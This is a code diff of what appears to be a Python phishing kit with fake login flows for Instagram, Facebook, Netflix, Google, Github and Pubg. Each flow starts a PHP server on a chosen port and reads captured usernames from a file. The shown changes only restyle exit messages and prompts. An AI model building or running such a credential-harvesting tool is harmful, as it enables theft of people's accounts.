@@ -100,9 +100,10 @@ print(f"""
 
 
 try:
-    ask = input(Fore.MAGENTA + "which option you want: ".title() + Fore.RESET)
+    ask = input(Fore.MAGENTA + "which option you want : ".title() + Fore.RESET)
 except KeyboardInterrupt:
-    exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")
+    exit(f"""\n{Fore.GREEN}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
 
 #option 0 ====================================================================================================
 def zero_exit():
@@ -120,7 +121,8 @@ def instagram():
     try:
         port = input(Fore.MAGENTA + "\nwhich port want to open (default 80):".title() + Fore.RESET)
     except KeyboardInterrupt:
-        exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")
+        exit(f"""\n{Fore.GREEN}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
 
 #====================================================================================================
     php_server()
@@ -169,7 +171,8 @@ def instagram():
                     break
 
     except KeyboardInterrupt:
-        exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")
+        exit(f"""\n{Fore.GREEN}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
 
 #write username====================================================================================================
     while True:
@@ -229,7 +232,8 @@ def facebook():
     try:
         port = input(Fore.MAGENTA + "\nwhich port want to open (default 80):" + Fore.RESET)
     except KeyboardInterrupt:
-        exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")
+        exit(f"""\n{Fore.GREEN}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
 
 #====================================================================================================
     php_server()
@@ -275,7 +279,8 @@ def facebook():
                     break
 
     except KeyboardInterrupt:
-        exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")
+        exit(f"""\n{Fore.GREEN}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
 
 #write username====================================================================================================
     while True:
@@ -333,7 +338,8 @@ def netflix():
     try:
         port = input(Fore.MAGENTA + "\nwhich port want to open (default 80):" + Fore.RESET)
     except KeyboardInterrupt:
-        exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")
+        exit(f"""\n{Fore.GREEN}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
 
 
 #====================================================================================================
@@ -380,7 +386,8 @@ def netflix():
     
                     break
     except KeyboardInterrupt:
-        exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")
+        exit(f"""\n{Fore.GREEN}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
 
 #write username====================================================================================================
     while True:
@@ -439,7 +446,8 @@ def Google():
     try:
         port = input(Fore.MAGENTA + "\nwhich port want to open (default 80):" + Fore.RESET)
     except KeyboardInterrupt:
-            exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")
+            exit(f"""\n{Fore.GREEN}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
 
 #====================================================================================================
     php_server()
@@ -486,8 +494,8 @@ def Google():
                     break
 
     except KeyboardInterrupt:
-        exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")
-
+        exit(f"""\n{Fore.GREEN}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
 
 #write username====================================================================================================
     while True:
@@ -544,8 +552,8 @@ def Github():
     try:
         port = input(Fore.MAGENTA + "\nwhich port want to open (default 80):" + Fore.RESET)
     except KeyboardInterrupt:
-            exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")
-
+            exit(f"""\n{Fore.GREEN}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
 
 #====================================================================================================
     php_server()
@@ -594,8 +602,8 @@ def Github():
                     break
 
     except KeyboardInterrupt:
-        exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")
-
+        exit(f"""\n{Fore.GREEN}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
 #write username====================================================================================================
     while True:
         size = os.stat("username_key.txt")
@@ -652,7 +660,8 @@ def Pubg():
     try:
         port = input(Fore.MAGENTA + "\nWhich port want to open (default 80):" + Fore.RESET)
     except KeyboardInterrupt:
-            exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")
+            exit(f"""\n{Fore.GREEN}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
     
 #====================================================================================================
     php_server()
@@ -702,7 +711,8 @@ def Pubg():
                     break
 
     except KeyboardInterrupt:
-        exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")
+        exit(f"""\n{Fore.GREEN}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
     
 #write username====================================================================================================
     while True:
